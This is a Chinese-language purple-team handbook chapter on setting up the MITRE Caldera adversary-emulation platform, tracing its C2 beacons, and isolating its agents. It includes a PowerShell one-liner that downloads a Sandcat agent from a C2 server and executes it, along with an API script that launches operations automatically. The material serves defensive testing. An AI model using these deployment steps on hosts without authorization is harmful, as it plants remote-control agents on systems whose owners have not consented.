# 實戰手冊 27.2：MITRE Caldera 自動化對抗模擬平台佈建、代理程式 (Agent) 部署與端到端滲透驗證

## 案發現場破題

在企業內部網路、多網段隔離環境與大規模 Active Directory 網域架構中，單純手動執行單一原子測試（如 Atomic Red Team）難以有效評估攻擊者發動「連續多階段連環滲透」時藍隊的動態防護與告警鏈條。真實世界中的國家級進階持續性威脅（APT）絕不會只執行一次憑證轉儲，而是遵循高度組織化的攻擊目標鏈條——從初始立足點探測、本機特權提升、內部憑證收割、內網橫向移動（Lateral Movement）到最終的資料打包與 C2 隱蔽外洩。

由 MITRE 官方主導研發的開源自動化威脅模擬平台 **Caldera**，為紫隊演練（Purple Teaming）提供了工業級的體系化解決方案。Caldera 透過四大模組聯動：伺服器核心（Core Engine）、自適應規劃器（Planners）、能力庫（Abilities）與輕量級多平台代理程式（Sandcat Agents），能夠精確模擬特定黑客組織（Adversary Profiles，如 FIN7, APT29）的進攻決策樹。

身為藍隊防禦工程師與紫隊專家，必須深入掌握 Caldera 伺服器佈建、動態 Agent 編譯生成、剖析 C2 隱蔽通訊協議（HTTP / SSL / DNS 通道），並在受控環境中發起端到端自動化滲透測試，以實證檢驗 SOC 告警鏈條、SIEM 關聯規則與端點 EDR 阻斷縱深。

## 第一動：Caldera 核心架構與威脅模擬模型

### 1.1 Caldera 四大核心概念模組
1. **Ability（能力）**：對應特定 ATT&CK 戰術的具體操作腳本。每項 Ability 包含了具體的命令列語法、支援的作業系統（Windows, Linux, macOS）、以及所採用的執行器（Executors，例如 PowerShell, Cmd, Bash, Sh, Python）。
2. **Adversary Profile（威脅畫像）**：將數十個 Ability 依據真實攻擊邏輯串聯的範本集合，能夠精準模擬特定威脅組織（如 APT29 俄羅斯對外情報局、Lazarus 北韓網軍）的戰術習慣。
3. **Planner（自適應規劃器）**：Caldera 的決策靈魂所在。不同於單純的線性批次腳本，Planner 會依據 Agent 當前在受害端點收集到的動態事實（Facts，例如獲取到的本機使用者名稱、網域伺服器 IP、管理員密碼雜湊）動態推演並決定下一步最優進攻路徑。
4. **Operation（演習行動實體）**：一次完整的對抗演練實體。在此模組中綁定特定的 Adversary Profile、受測 Agent 範圍、排程時間與自治度模式（Autonomous 全自動模式 vs Paused 逐步確認模式）。

### 1.2 Sandcat Agent 運作機制與生命週期
- Sandcat 是 Caldera 預設的跨平台 Go 語言代理程式。
- **無磁碟或自解密記憶體執行**：可透過 PowerShell 反射載入（Reflective Loading）或原生編譯之二進位 ELF/PE 執行。
- **心跳回傳（Beacon Loop）**：預設每 5 秒透過 HTTP POST 向 Caldera 伺服器發起連線，回傳上一條指令的標準輸出（Stdout）與錯誤碼（Stderr），並取得下一條由 Planner 派發的 Ability 指令。

## 第二動：Caldera 通訊特徵與日誌追蹤定位

### 2.1 網路流量特徵（C2 Beacons）
- 預設連線連接埠：`8888`（HTTP）或透過反向代理封裝之 `443`（HTTPS）。
- 心跳通訊標頭特徵：HTTP Header 包含 `KEY: <api_token>` 與自訂 User-Agent。
- Payload 下載路徑：`/file/download`，常用於向端點動態傳輸工具組件。

### 2.2 端點執行日誌特徵（Sysmon / Auditd）
- **Windows 端點特徵**：`sandcat.exe` 或任意偽裝名稱拉起 `cmd.exe /c` 或 `powershell.exe -exec bypass`。
- **Linux 端點特徵**：進程於背景常駐，建立對外 TCP Socket 至控制伺服器，並頻繁調用 `/bin/sh -c` 執行資訊搜集指令。

## 第三動：手動獵捕與鑑識分析（Caldera 佈建與 Operation）

### 3.1 佈建 Caldera 伺服器環境（Docker 模式）
```bash
# 步驟 1：使用官方 Docker Compose 快速啟動 Caldera
git clone https://github.com/mitre/caldera.git --recursive
cd caldera
docker build -t caldera:latest .
docker run -d -p 8888:8888 --name caldera_server caldera:latest

# 步驟 2：登入 Web 管理介面 (預期監聽 0.0.0.0:8888, 預設憑證 red/admin)
curl -I http://localhost:8888
```

### 3.2 部署 Sandcat Agent 至受害目標端點
```powershell
# 在測試端點主機透過一鍵式 PowerShell 部署 Sandcat Agent
$server="http://192.168.10.50:8888";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("file","sandcat.go");
$output="C:\Users\Public\sandcat.exe";
$wc.DownloadFile($url,$output);
C:\Users\Public\sandcat.exe -server $server -group blue_eval -v
```

### 3.3 發起端到端自動化滲透行動（Operation Creation）
在 Caldera GUI 中建立 Operation：
- **Name**: `Operation_Enterprise_Baseline_Audit`
- **Adversary**: `Hunter` 或 `Discovery`
- **Planner**: `Atomic`（步步為營模式）
- **Fact Sources**: `basic`
- 點擊「Start」後，平台即時顯示 Agent 回傳之攻擊步驟與拓撲節點。

### 3.4 Python 呼叫 Caldera API 自動化觸發測試行動
```python
import requests
import json
import time

def trigger_caldera_operation(caldera_url, api_key):
    headers = {
        "KEY": api_key,
        "Content-Type": "application/json"
    }
    
    print(f"[*] 連線 Caldera C2 平台: {caldera_url}")
    
    # 步驟 1: 檢查線上活躍 Agent 清單
    r_agents = requests.get(f"{caldera_url}/api/v2/agents", headers=headers)
    agents = r_agents.json()
    print(f"[+] 當前線上 Agent 數量: {len(agents)}")
    for a in agents:
        print(f"  - Agent: {a.get('paw')} | Host: {a.get('host')} | OS: {a.get('platform')}")

    # 步驟 2: 建立並發起演習行動
    payload = {
        "name": "Auto_Audit_Operation",
        "adversary": {"adversary_id": "ad-hoc"},
        "planner": {"planner_id": "atomic"},
        "group": "blue_eval",
        "autonomous": 1
    }
    
    r_op = requests.post(f"{caldera_url}/api/v2/operations", headers=headers, json=payload)
    if r_op.status_code == 200:
        op_data = r_op.json()
        op_id = op_data.get('id')
        print(f"[+] 成功啟動 Operation ID: {op_id}")
        
        # 輪詢行動狀態
        for _ in range(5):
            time.sleep(3)
            status_res = requests.get(f"{caldera_url}/api/v2/operations/{op_id}", headers=headers)
            if status_res.status_code == 200:
                cur_state = status_res.json().get('state')
                print(f"[*] Operation 當前運行狀態: {cur_state}")
                if cur_state in ['finished', 'cleanup']:
                    break
    else:
        print(f"[-] 建立 Operation 失敗: {r_op.text}")

if __name__ == '__main__':
    trigger_caldera_operation("http://localhost:8888", "ADMIN123")
```

## 第五動：企業級防禦硬化與應急響應阻斷

### 5.1 部署 Agent 自防禦與隔離機制
- 當 EDR 或 SIEM 偵測到未授權之 Agent 常駐程序時：
  1. **本機進程終止與檔案隔離**：利用 EDR 自動化腳本強制終止 `sandcat.exe`。
  2. **防火牆邊界阻斷**：阻斷目標主機對 Caldera 伺服器 8888 埠之 Outbound 網路連線。
  3. **存取權限審查**：審查目標機器之管理員帳號與本機憑證暫存，防止憑證已被傾印外洩。

### 5.2 建立企業對抗模擬審批與白名單制度
- 嚴格落實 BAS 平台管理準則。任何 Caldera 演練必須具備明確時間窗口、特定目標 IP 白名單，並事先知會 SOC 值班主管，防範演習行為引發真假難辨之業務混亂。
